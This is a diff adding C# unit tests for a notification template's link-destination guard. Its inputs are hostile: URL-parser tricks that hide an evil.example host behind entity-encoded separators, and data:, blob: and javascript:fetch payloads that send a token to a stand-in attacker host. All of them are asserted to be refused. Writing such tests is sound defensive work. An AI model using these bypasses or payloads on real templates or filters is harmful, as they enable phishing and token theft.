@@ -433,6 +433,198 @@ public sealed class RenderedDestinationPolicyTests
         result.IsSuccess.ShouldBeTrue(result.Error);
     }
 
+    /// <summary>
+    /// The rendered form is refused for the spelling a client resolves, not
+    /// only for the one an author would write. Each of these reaches
+    /// evil.example, in text and in markup, on the render path and on the
+    /// publication path alike.
+    /// </summary>
+    [Theory]
+    [InlineData("""Acesse https:\\evil.example/pagar para concluir.""")]
+    [InlineData("""Acesse https:/\evil.example/pagar para concluir.""")]
+    [InlineData("""Acesse https:evil.example/pagar para concluir.""")]
+    [InlineData("""Acesse https:/evil.example/pagar para concluir.""")]
+    [InlineData("""Acesse \\evil.example/pagar para concluir.""")]
+    public void A_scheme_separated_from_its_authority_by_anything_is_still_refused(string body)
+    {
+        Result result = RenderedDestinationPolicy.Validate(
+            MakeTemplate(),
+            Channel.Push,
+            subject: null,
+            body,
+            bodyText: null);
+
+        result.IsFailure.ShouldBeTrue();
+        DomainErrorInfo error = DomainError.Describe(result.Error, result.ErrorKind);
+        error.Code.ShouldBe(ErrorCodes.UrlDomainNotAllowed);
+        error.Detail.ShouldContain("evil.example");
+    }
+
+    /// <summary>
+    /// A separator a client removes before resolving the URL does not truncate
+    /// the authority the guard reads, and the value it carried never becomes
+    /// the detail of the refusal.
+    /// </summary>
+    [Theory]
+    [InlineData("""<a href="https://assets.montebravo.com.br&#9;@evil&#9;.example?token=tok_personal_123">ir</a>""")]
+    [InlineData("""<a href="https://assets.montebravo.com.br&#10;@evil&#10;.example?token=tok_personal_123">ir</a>""")]
+    [InlineData("""<a href="https://assets.montebravo.com.br&#13;@evil&#13;.example?token=tok_personal_123">ir</a>""")]
+    [InlineData("""<a href="https://assets.montebravo.com.br&#x09;@evil&#x09;.example?token=tok_personal_123">ir</a>""")]
+    [InlineData("""<img src="https://assets.montebravo.com.br&#9;@evil&#9;.example?token=tok_personal_123">""")]
+    [InlineData("""<form action="https://assets.montebravo.com.br&#9;@evil&#9;.example?token=tok_personal_123"></form>""")]
+    public void A_truncating_separator_is_refused_without_disclosing_its_value(string body)
+    {
+        Result result = RenderedDestinationPolicy.Validate(
+            MakeTemplate(),
+            Channel.Email,
+            subject: null,
+            body,
+            bodyText: null);
+
+        result.IsFailure.ShouldBeTrue();
+        DomainErrorInfo error = DomainError.Describe(result.Error, result.ErrorKind);
+        error.Code.ShouldBe(ErrorCodes.UrlDomainNotAllowed);
+        error.Detail.ShouldContain("evil.example");
+        error.Detail.ShouldNotContain("token=");
+        error.Detail.ShouldNotContain("tok_personal_123");
+    }
+
+    [Fact]
+    public void A_truncating_separator_does_not_hide_a_foreign_subdomain()
+    {
+        const string Body =
+            """<a href="https://assets.montebravo.com.br&#9;.evil&#9;.example/pagar">ir</a>""";
+
+        Result result = RenderedDestinationPolicy.Validate(
+            MakeTemplate(),
+            Channel.Email,
+            subject: null,
+            Body,
+            bodyText: null);
+
+        result.IsFailure.ShouldBeTrue();
+        DomainError.Describe(result.Error, result.ErrorKind).Detail
+            .ShouldContain("assets.montebravo.com.br.evil.example");
+    }
+
+    /// <summary>
+    /// A destination that carries its payload instead of naming a place is
+    /// refused, and the refusal says only the fixed marker: the value is
+    /// attacker-supplied and may encode anything at all.
+    /// </summary>
+    [Theory]
+    [InlineData("""<a href="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnaHR0cHM6Ly9ldmlsLmV4YW1wbGUuaW8vP3Q9dG9rX3BlcnNvbmFsXzEyMycpPC9zY3JpcHQ+">ir</a>""")]
+    [InlineData("""<a href="blob:https://assets.montebravo.com.br/tok_personal_123">ir</a>""")]
+    [InlineData("""<a href="d&#9;ata:text/html;base64,dG9rX3BlcnNvbmFsXzEyMw==">ir</a>""")]
+    public void A_destination_with_a_scheme_this_catalog_does_not_deliver_is_refused(string body)
+    {
+        Result result = RenderedDestinationPolicy.Validate(
+            MakeTemplate(),
+            Channel.Email,
+            subject: null,
+            body,
+            bodyText: null);
+
+        result.IsFailure.ShouldBeTrue();
+        DomainErrorInfo error = DomainError.Describe(result.Error, result.ErrorKind);
+        error.Code.ShouldBe(ErrorCodes.UrlDomainNotAllowed);
+        error.Detail.ShouldContain(LinkDomainPolicy.UnresolvedHost);
+        error.Detail.ShouldNotContain("tok_personal_123");
+        error.Detail.ShouldNotContain("example.io");
+    }
+
+    /// <summary>
+    /// The guard refuses on the authority a client resolves, whatever character
+    /// the author put in the middle of it, and still says only the host.
+    /// </summary>
+    [Theory]
+    [InlineData("&quot;")]
+    [InlineData("&#34;")]
+    [InlineData("&apos;")]
+    [InlineData("&#39;")]
+    [InlineData("&lt;")]
+    [InlineData("&gt;")]
+    [InlineData("&nbsp;")]
+    [InlineData("&#160;")]
+    [InlineData("&#8201;")]
+    [InlineData("&#12288;")]
+    public void A_separator_the_candidate_cannot_carry_is_refused_without_disclosing_its_value(string planted)
+    {
+        var body =
+            $"""<a href="https://assets.montebravo.com.br{planted}@evil.example?token=tok_personal_123">ir</a>""";
+
+        Result result = RenderedDestinationPolicy.Validate(
+            MakeTemplate(),
+            Channel.Email,
+            subject: null,
+            body,
+            bodyText: null);
+
+        result.IsFailure.ShouldBeTrue();
+        DomainErrorInfo error = DomainError.Describe(result.Error, result.ErrorKind);
+        error.Code.ShouldBe(ErrorCodes.UrlDomainNotAllowed);
+        error.Detail.ShouldContain("evil.example");
+        error.Detail.ShouldNotContain("token=");
+        error.Detail.ShouldNotContain("tok_personal_123");
+    }
+
+    /// <summary>
+    /// A refused scheme names the host it carried, so the author can act on the
+    /// refusal, and still discloses nothing else about the value.
+    /// </summary>
+    [Theory]
+    [InlineData("""<a href="blob:https://evil.example/tok_personal_123">ir</a>""")]
+    [InlineData("""<a href="javascript:fetch('https://evil.example/?t=tok_personal_123')">ir</a>""")]
+    public void A_refused_scheme_names_its_host_without_disclosing_the_value(string body)
+    {
+        Result result = RenderedDestinationPolicy.Validate(
+            MakeTemplate(),
+            Channel.Email,
+            subject: null,
+            body,
+            bodyText: null);
+
+        result.IsFailure.ShouldBeTrue();
+        DomainErrorInfo error = DomainError.Describe(result.Error, result.ErrorKind);
+        error.Code.ShouldBe(ErrorCodes.UrlDomainNotAllowed);
+        error.Detail.ShouldContain("evil.example");
+        error.Detail.ShouldNotContain("tok_personal_123");
+    }
+
+    /// <summary>
+    /// A template that already publishes with a doubled slash in a path keeps
+    /// rendering. The guard decides the rendered result, so a false host read
+    /// out of a path is not a refused publication, it is an outage.
+    /// </summary>
+    [Theory]
+    [InlineData("""<img src="https://assets.montebravo.com.br//imagens/logo.png">""")]
+    [InlineData("""<a href="https://assets.montebravo.com.br//pt-br/faturas/2026">abrir</a>""")]
+    [InlineData("""<img src="https://assets.montebravo.com.br/t//open.gif?id=abc">""")]
+    public void A_doubled_slash_inside_a_path_still_renders(string body)
+    {
+        Result result = RenderedDestinationPolicy.Validate(
+            MakeTemplate(),
+            Channel.Email,
+            subject: null,
+            body,
+            bodyText: null);
+
+        result.IsSuccess.ShouldBeTrue(result.Error);
+    }
+
+    [Fact]
+    public void A_note_about_configuration_still_renders()
+    {
+        Result result = RenderedDestinationPolicy.Validate(
+            MakeTemplate(),
+            Channel.Push,
+            subject: "Integração atualizada",
+            body: "O parceiro retornou codigo HTTP:200 e o campo https:true no contrato.",
+            bodyText: """Erro HTTP:404 tratado; compartilhamento \\fileserver\notas.""");
+
+        result.IsSuccess.ShouldBeTrue(result.Error);
+    }
+
     private static Template MakeTemplate()
         => Template.Create(TemplateKey.Create("orders.status.changed").Value!, new TemplateMetadata
         {
